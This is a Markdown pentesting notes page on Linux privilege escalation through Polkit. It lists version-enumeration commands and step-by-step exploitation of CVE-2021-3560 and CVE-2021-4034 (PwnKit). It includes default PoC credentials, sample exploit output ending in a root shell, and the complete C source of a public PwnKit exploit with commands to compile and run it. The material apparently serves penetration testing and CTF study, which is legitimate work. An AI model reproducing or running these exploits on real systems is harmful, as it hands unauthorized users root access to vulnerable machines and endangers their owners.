---
id: Polkit
aliases: []
tags:
  - Linux/Privesc/Polkit
links: "[[Linux/Privesc/General]]"
---

# Polkit

Escalate privileges via [[General/Polkit|Polkit]]

___

<!-- Enumeration {{{-->
## Enumeration

Enumerate installed polkit version

```sh
pkcheck --version
```

```sh
polkitd --version
```

```sh
dpkg -s policykit-1
```

```sh
dpkg -l | grep policykit
```

```sh
rpm -qa | grep polkit
```

___
<!-- }}} -->

<!-- Exploitation {{{-->
## Exploitation

<!-- CVE-2021-3560 {{{-->
### CVE-2021-3560

[CVE-2021-3560](https://nvd.nist.gov/vuln/detail/cve-2021-3560) —
Polkit version < `0.119` Credential Check Bypass Privilege Escalation

<!-- Info {{{-->
> [!info]-
>
> It was [found](https://www.hackingarticles.in/linux-privilege-escalation-polkit-cve-2021-3560/)
> that Polkit version < `0.119` could be tricked
> into bypassing the credential checks for D-Bus requests,
> elevating the privileges of the requestor to the `root` user
>
<!-- }}} -->

1. Edit the [PoC](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation)
   or use the default credentials

```sh
username="secnigma"
```
```sh
password="secnigmaftw"
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> if [[ $USR ]];then
>     username=$(echo $USR)
> else
>     username="<new_user>"
> fi
> ```
> ```sh
> if [[ $PASS ]];then
>     password=$(echo $PASS)
> else
>     password="<new_password>"
> fi
> ```
<!-- }}} -->

2. Set permissions

```sh
chmod +x poc.sh
```

3. Exploit

```sh
./poc.sh
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> [dwight@paper ~]$ ./exploit.sh
> ```
> ```sh
> [!] Username set as : pentest
> [!] No Custom Timing specified.
> [!] Timing will be detected Automatically
> [!] Force flag not set.
> [!] Vulnerability checking is ENABLED!
> [!] Starting Vulnerability Checks...
> [!] Checking distribution...
> [!] Detected Linux distribution as "centos"
> [!] Checking if Accountsservice and Gnome-Control-Center is installed
> [+] Accounts service and Gnome-Control-Center Installation Found!!
> [!] Checking if polkit version is vulnerable
> [+] Polkit version appears to be vulnerable!!
> [!] Starting exploit...
> [!] Inserting Username pentest...
> Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
> [+] Inserted Username pentest  with UID 1005!
> [!] Inserting password hash...
> [!] It looks like the password insertion was succesful!
> [!] Try to login as the injected user using su - pentest
> [!] When prompted for password, enter your password 
> [!] If the username is inserted, but the login fails; try running the exploit again.
> [!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
> ```
<!-- }}} -->

4. Switch to the new user

```sh
su secnigma
```

<!-- Example {{{-->
> [!example]-
>
>
> ```sh
> [dwight@paper ~]$ su pentest
> ```
> ```sh
> Password:
> ```
> ```sh
> [pentest@paper dwight]$ whoami
> ```
> ```sh
> pentest
> ```
<!-- }}} -->


5. Spawn a `root` shell

```sh
sudo bash
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> [pentest@paper home]$ sudo bash
> ```
> ```
> We trust you have received the usual lecture from the local System
> Administrator. It usually boils down to these three things:
>
>     #1) Respect the privacy of others.
>     #2) Think before you type.
>     #3) With great power comes great responsibility.
> [sudo] password for pentest:
> ```
> ```
> [root@paper home]# whoami
> ```
> ```sh
> root
> ```
<!-- }}} -->

<!-- }}} -->

<!-- CVE-2021-4034 (PwnKit) {{{-->
### CVE-2021-4034

[CVE-2021-4034](https://nvd.nist.gov/vuln/detail/cve-2021-4034) (**PwnkKit**) —
Privileged Command Execution Privilege Escalation affecting `pkexec`

<!-- Info {{{-->
> [!info]-
>
> A local privilege escalation vulnerability
> was [found](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)
> on polkit's `pkexec` utility.
>
> The `pkexec` application is a setuid tool designed
> to allow unprivileged users to run commands as privileged users
> according predefined policies.
>
> The current version of `pkexec` doesn't handle
> the calling parameters count correctly
> and ends trying to execute environment variables as commands.
>
> An attacker can leverage this
> by crafting environment variables in such a way
> it'll induce pkexec to execute arbitrary code.
>
> When successfully executed
> the attack can cause a local privilege escalation
> given unprivileged users administrative rights
> on the target machine.
>
> Debian
>
> - < `0.105-18+deb9u2` (stretch)
> - < `0.105-25+deb10u1` (buster)
> - < `0.105-31+deb11u1` (bullseye)
> - < `0.105-31.1` (unstable / bookworm)
>
> Ubuntu
>
> - 14.04 ESM: < `policykit-1 0.105-4ubuntu3.14.04.6+esm1`
> - 16.04 ESM: < `policykit-1 0.105-14.1ubuntu0.5+esm1 `
> - 18.04 LTS: < `policykit-1 0.105-20ubuntu0.18.04.6 `
> - 20.04 LTS: < `policykit-1 0.105-26ubuntu1.2 `
> - 21.10: < `policykit-1 0.105-31ubuntu0.1 `
>
> RHEL/CentOS 6
>
> - polkit < `0.96-11.el6_10.2`
>
> RHEL/CentOS 7
>
> - polkit < `0.112-26.el7_9.1`
>
> RHEL/CentOS 8
>
> - polkit < `0.115-13.el8_5.1`
>
> Fedora
>
> - polkit < `0.120-1.fc35.1`
>
> SUSE Linux Enterprise
>
> - polkit ≥ `0.115-13.el8_5.1`
>
> SUSE SLE 15 SP4+/SP5:
>
> - polkit/libpolkit ≥ `0.116-3.6.1`
<!-- }}} -->

<!-- Exploit {{{-->
> [!tip]- Exploit
>
> ```sh
> touch exploit.c
> ```
> ```sh
> vim exploit.c
> ```
> ```sh
> gcc exploit.c -o exploit
> ```
> ```sh
> ./exploit
> ```
>
> [GitHub - arthepsy/CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c)
>
> ```c
> /*
>  * Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) by Andris Raugulis <moo@arthepsy.eu>
>  * Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
>  */
> #include <stdio.h>
> #include <stdlib.h>
> #include <unistd.h>
>
> char *shell = 
> 	"#include <stdio.h>\n"
> 	"#include <stdlib.h>\n"
> 	"#include <unistd.h>\n\n"
> 	"void gconv() {}\n"
> 	"void gconv_init() {\n"
> 	"	setuid(0); setgid(0);\n"
> 	"	seteuid(0); setegid(0);\n"
> 	"	system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"
> 	"	exit(0);\n"
> 	"}";
> 
> int main(int argc, char *argv[]) {
> 	FILE *fp;
> 	system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
> 	system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
> 	fp = fopen("pwnkit/pwnkit.c", "w");
> 	fprintf(fp, "%s", shell);
> 	fclose(fp);
> 	system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
> 	char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
> 	execve("/usr/bin/pkexec", (char*[]){NULL}, env);
> }
> ```
<!-- }}} -->

```sh
git clone https://github.com/arthepsy/CVE-2021-4034.git
```
```sh
cd CVE-2021-4034
```
```sh
gcc cve-2021-4034-poc.c -o poc
```
```sh
./poc
```

<!-- }}} -->

___
<!-- }}} -->
